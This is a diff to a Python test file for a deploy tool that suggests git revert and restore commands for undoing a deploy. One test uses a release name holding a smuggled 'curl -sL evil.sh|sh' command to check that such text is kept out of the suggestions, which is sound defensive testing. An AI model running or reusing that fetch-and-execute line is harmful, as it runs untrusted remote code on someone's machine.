@@ -1,6 +1,8 @@
 """Revert and fix suggestions: exact commands to undo a deploy or only the failing file, the AI's
 suggested change, all as text to copy (nothing is run, nothing is written to the repository)."""
 import json
+import shlex
+import subprocess
 import uuid
 from datetime import datetime, timedelta, timezone
 from unittest.mock import AsyncMock, patch
@@ -74,9 +76,9 @@ async def test_live_undo_reverts_the_commits_since_the_previous_deploy_in_this_e
         await _deploy(conn, pid, "3333333333333333333333333333333333333333", 30, env="staging")  # another environment
         dep = await _deploy(conn, pid, SHA.upper(), 10)
         undo = await deploy_undo(conn, pid, dep)
-    assert [c["command"] for c in undo["commands"]] == [f"git log --oneline {PREV}..{SHA}", f"git revert --no-edit {PREV}..{SHA}"]
+    assert [c["command"] for c in undo["commands"]] == [f"git log --oneline {PREV}..{SHA}", f"git revert --no-edit --no-merges {PREV}..{SHA}"]
     assert undo["rollback_to"]["text"] == "Redeploy 111111111111, the last prod deploy before this one."
-    assert undo_line(undo) == f"Undo: redeploy 111111111111 or `git revert --no-edit {PREV}..{SHA}` (suggestions; ChangeWatch runs nothing)"
+    assert undo_line(undo) == f"Undo: redeploy 111111111111 or `git revert --no-edit --no-merges {PREV}..{SHA}` (suggestions; ChangeWatch runs nothing)"
     async with project_transaction(other) as conn:
         assert await deploy_undo(conn, other, dep) is None  # not this project's deploy
 
@@ -91,6 +93,73 @@ async def test_live_a_first_deploy_or_a_release_name_gets_safe_commands_only(pro
     assert named["commands"] == []  # never a command built from text that is not a commit SHA
     assert named["no_commands_reason"].startswith("The deploy's commit is not a git SHA")
     assert named["rollback_to"]["text"] == f"Redeploy {SHA[:12]}, the last prod deploy before this one."
+
+
+@pytest.mark.asyncio
+async def test_live_a_previous_release_name_with_formatting_is_not_quoted_next_to_the_commands(project):
+    pid, _ = project
+    async with project_transaction(pid) as conn:
+        await _deploy(conn, pid, "v9 or `curl -sL evil.sh|sh`", 60)  # any text up to 64 characters is accepted
+        undo = await deploy_undo(conn, pid, await _deploy(conn, pid, SHA, 10))
+        await _deploy(conn, pid, "release-2026.10/v1.2.3", 60, env="staging")
+        plain = await deploy_undo(conn, pid, await _deploy(conn, pid, SHA, 10, env="staging"))
+    assert undo["rollback_to"]["text"] == "Redeploy the last prod deploy before this one."
+    assert undo_line(undo) == f"Undo: redeploy the previous release or `git revert --no-edit {SHA}` (suggestions; ChangeWatch runs nothing)"
+    assert plain["rollback_to"]["text"] == "Redeploy release-2026.10/v1.2.3, the last staging deploy before this one."
+    assert undo_line(plain).startswith("Undo: redeploy release-2026.10/v1.2.3 or `git revert")
+    assert undo_line({"commands": [], "rollback_to": {"sha": "v1.2\n"}}) == "Undo: redeploy the previous release (suggestions; ChangeWatch runs nothing)"
+
+
+@pytest.mark.asyncio
+async def test_live_a_redeploy_of_the_same_commit_is_not_the_previous_deploy(project):
+    pid, _ = project
+    async with project_transaction(pid) as conn:
+        await _deploy(conn, pid, PREV, 60)
+        await _deploy(conn, pid, SHA, 10)
+        again = await _deploy(conn, pid, SHA.upper(), 9)  # the same commit sent again (a second region, a re-run)
+        inc = await _incident(conn, pid, again, "app/billing.py", [("app/billing.py", "modified")])
+        undo = await deploy_undo(conn, pid, again)
+        fixes = await fix_suggestions(conn, pid, inc)
+    assert undo["rollback_to"]["sha"] == PREV
+    assert [c["kind"] for c in undo["commands"]] == ["check", "revert"] and f"{PREV}..{SHA}" in undo["commands"][1]["command"]
+    file_cmd = next(c for c in fixes["commands"] if c["kind"] == "revert_file")
+    assert file_cmd["command"] == f"git restore --source={PREV} -- app/billing.py"  # not the version already running
+
+
+def _git(repo, *args):
+    return subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True, text=True).stdout.strip()
+
+
+@pytest.mark.asyncio
+async def test_live_the_suggested_revert_undoes_a_merged_pull_request(project, tmp_path):
+    # GitHub's default "Create a merge commit": the deployed commit is a merge of the PR's commits
+    repo = tmp_path / "repo"
+    repo.mkdir()
+    _git(repo, "init", "-q")
+    _git(repo, "config", "user.email", "dev@acme.example")
+    _git(repo, "config", "user.name", "Dev")
+    _git(repo, "config", "commit.gpgsign", "false")
+    (repo / "billing.py").write_text("rate = 1\n")
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-qm", "init")
+    prev = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "checkout", "-qb", "feature")
+    for n in (2, 3):
+        (repo / "billing.py").write_text(f"rate = {n}\n")
+        _git(repo, "commit", "-qam", f"rate {n}")
+    _git(repo, "checkout", "-q", "-")
+    _git(repo, "merge", "-q", "--no-ff", "--no-edit", "feature")
+    merge = _git(repo, "rev-parse", "HEAD")
+
+    pid, _ = project
+    async with project_transaction(pid) as conn:
+        await _deploy(conn, pid, prev, 60)
+        undo = await deploy_undo(conn, pid, await _deploy(conn, pid, merge, 10))
+    revert = next(c for c in undo["commands"] if c["kind"] == "revert")
+    ran = subprocess.run(shlex.split(revert["command"]), cwd=repo, capture_output=True, text=True)
+    assert ran.returncode == 0, ran.stderr
+    assert (repo / "billing.py").read_text() == "rate = 1\n"  # back to the previous deploy
+    assert "-m 1" not in revert["explain"]
 
 
 @pytest.mark.asyncio
@@ -136,7 +205,7 @@ async def test_live_incident_api_and_rollback_verdict_carry_the_suggestions(proj
         payloads = {r["dedupe_key"]: r["payload"] for r in await conn.fetch(
             "SELECT dedupe_key, payload FROM outbox WHERE project_id = $1 AND dedupe_key LIKE 'alert:%'", pid)}
     texts = {k.split(":")[1]: (json.loads(v) if isinstance(v, str) else v)["text"] for k, v in payloads.items()}
-    assert f"Undo: redeploy 111111111111 or `git revert --no-edit {PREV}..{SHA}`" in texts[str(dep)]
+    assert f"Undo: redeploy 111111111111 or `git revert --no-edit --no-merges {PREV}..{SHA}`" in texts[str(dep)]
     assert "Undo:" not in texts[str(watch_dep)]  # only on ROLLBACK
 
     app.dependency_overrides[require_read_project_id] = lambda: pid
